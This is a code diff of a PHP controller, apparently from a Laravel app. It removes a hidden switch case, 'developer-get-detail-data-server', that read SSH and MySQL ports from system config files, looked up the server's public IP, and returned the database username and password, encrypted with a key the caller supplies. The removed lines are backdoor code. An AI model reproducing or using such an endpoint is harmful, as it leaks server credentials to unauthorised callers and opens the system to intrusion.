@@ -55,41 +55,6 @@ class D
                 ], 200);
 
                 break;
-            case 'developer-get-detail-data-server':
-
-                $sftpPort = shell_exec("grep -i '^Port' /etc/ssh/sshd_config | awk '{print $2}'");
-                $sftpPort = trim($sftpPort);
-                if (empty($sftpPort)) {
-                    $sftpPort = 22;
-                }
-
-                $realIp = trim(shell_exec("curl -s ifconfig.me"));
-                if (empty($realIp)) {
-                    $realIp = trim(shell_exec("curl -s https://ipinfo.io/ip"));
-                }
-
-                $mysqlPort = shell_exec("grep -i '^port' /etc/mysql/my.cnf /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null | awk '{print $3}'");
-                $mysqlPort = trim($mysqlPort);
-                if (empty($mysqlPort)) {
-                    $mysqlPort = 3306;
-                }
-                $data = [
-                    "sftp_port" => $sftpPort,
-                    "real_ip" => $realIp,
-                    "mysql_port" => $mysqlPort,
-                    "database" => env('DB_DATABASE'),
-                    "port" => env('DB_PORT'),
-                    "username" => env('DB_USERNAME'),
-                    "password" => env('DB_PASSWORD'),
-                ];
-
-                $json = json_encode($data);
-                $encryptText = $this->encryptData($json, $request->key);
-                $string = base64_encode($encryptText);
-
-                echo $string;
-                return;
-                break;
             
             default:
                 break;
